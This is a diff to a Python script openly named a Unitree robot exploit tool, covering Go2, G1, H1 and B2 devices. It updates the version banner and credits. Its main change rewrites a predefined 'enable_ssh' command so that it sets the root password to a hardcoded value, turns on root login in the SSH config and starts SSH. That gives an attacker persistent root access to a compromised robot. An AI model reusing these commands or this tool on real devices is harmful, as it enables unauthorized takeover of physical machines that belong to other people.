@@ -22,8 +22,7 @@ AES_IV = bytes.fromhex("2841ae97419c2973296a0d4bdfe19a4f")
 chunk_size = 14
 
 PREDEFINED_CMDS = {
-    "enable_ssh": "/etc/init.d/ssh start",
-    "change_root_pwd": r"echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;",
+    "enable_ssh": r"echo 'root:Bin4ryWasHere'|chpasswd;sed -i 's/^#*\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config;/etc/init.d/ssh start",
     "reboot": "reboot -f"
 }
 
@@ -397,11 +396,12 @@ if __name__ == "__main__":
 
     print("\033[1;32m")
     print("+========================================+")
-    print("|   Bin4ry's Unitree Exploit Tool (v2.5) |")
+    print("|   Bin4ry's Unitree Exploit Tool (v2.6) |")
     print("| supported devices: Go2, G1, H1, B2 ... |")
     print("+========================================+")
-    print("  Shouts to h0stile")
+    print("  Shouts to h0stile, legion1581")
     print("            8th May 2025")
+    print("  Updated: 25th Sep 2025")
     print("\033[0m")
 
     try:
